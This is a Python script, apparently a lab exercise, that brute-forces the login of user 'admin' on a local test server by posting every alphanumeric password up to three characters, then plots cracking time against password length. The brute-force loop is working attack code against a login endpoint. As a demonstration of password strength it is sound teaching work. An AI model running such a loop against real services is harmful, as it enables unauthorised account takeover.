import itertools
import requests
import time
import matplotlib.pyplot as plt

alphabet = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"
url = "http://localhost:8000/login"
username = "admin"
char_times = []

def brute_force(longitud_max):
    intentos = 0
    for longitud in range(1, longitud_max + 1):
        for combo in itertools.product(alphabet, repeat=longitud):
            intentos += 1
            password = "".join(combo)
            response = requests.post(url, json={"username": username, "password": password})
            if response.json().get("message") == "Login successful":
                return intentos, password
    return intentos, None

print("Iniciando ataque")
print(f"Target: {url}")
print(f"Usuario: {username}")
print("-----------------------------------")

for longitud_max in [1, 2, 3]:
    inicio = time.time()
    intentos, password = brute_force(longitud_max)
    tiempo = time.time() - inicio
    char_times.append((longitud_max, intentos, tiempo))
    if password:
        print(f"Contrasena encontrada: '{password}' en {intentos} intentos, {tiempo:.4f} segundos")
        break
    else:
        print(f"{longitud_max} caracter(es) -> {intentos} intentos, {tiempo:.4f} segundos")

longitudes = [d[0] for d in char_times]
tiempos = [d[2] for d in char_times]

plt.plot(longitudes, tiempos, marker="o")
plt.title("Tiempo vs Longitud de contraseña")
plt.xlabel("Cantidad de caracteres")
plt.ylabel("Tiempo (segundos)")
plt.savefig("grafica.png")
print("Grafica guardada como grafica.png")